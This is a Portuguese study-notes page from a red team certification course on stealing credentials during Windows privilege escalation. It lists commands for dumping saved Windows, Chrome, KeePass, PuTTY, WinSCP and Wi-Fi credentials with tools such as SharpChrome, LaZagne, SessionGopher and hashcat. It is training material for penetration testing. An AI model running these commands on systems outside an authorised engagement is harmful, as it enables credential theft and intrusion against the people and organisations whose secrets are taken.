> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/windows-privilege-escalation/further-credential-theft.md).

# Further Credential Theft

* **Lista de credenciais salvas**

```ps
cmdkey /list
```

* **Executar comandos como outro usuário**

```ps
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

* **Recuperando credenciais salvas no Chrome**

```ps
.\SharpChrome.exe logins /unprotect
```

* Podemos extrair  o hash no formato Hashcat usando o `keepass2john.py`script.

```ps
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
```

* Podemos então fornecer o hash ao Hashcat, especificando [o modo de hash](https://hashcat.net/wiki/doku.php?id=example_hashes) 13400 para o KeePas

```ps
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

* Quando tudo mais falhar, podemos executar a ferramenta [LaZagne](https://github.com/AlessandroZ/LaZagne) na tentativa de recuperar credenciais de uma ampla variedade de softwares.&#x20;

```ps
.\lazagne.exe all
```

* Podemos usar [o SessionGopher](https://github.com/Arvanaghi/SessionGopher) para extrair credenciais salvas do PuTTY, WinSCP, FileZilla, SuperPuTTY e RDP.&#x20;

{% code lineNumbers="true" %}

```ps
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

{% endcode %}

* **Enumerando o Autologon com reg.exe**

```ps
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Enumerando sessões e encontrando credenciais:**

* Primeiro, precisamos enumerar as sessões salvas disponíveis:

```ps
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

* Em seguida, analisamos as chaves e os valores da sessão descoberta `kali%20ssh`:

```ps
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

* **Visualizando redes sem fio salvas**

```ps
netsh wlan show profile
```

* **Recuperando senhas de redes sem fio salvas**

```ps
netsh wlan show profile ilfreight_corp key=clear
```
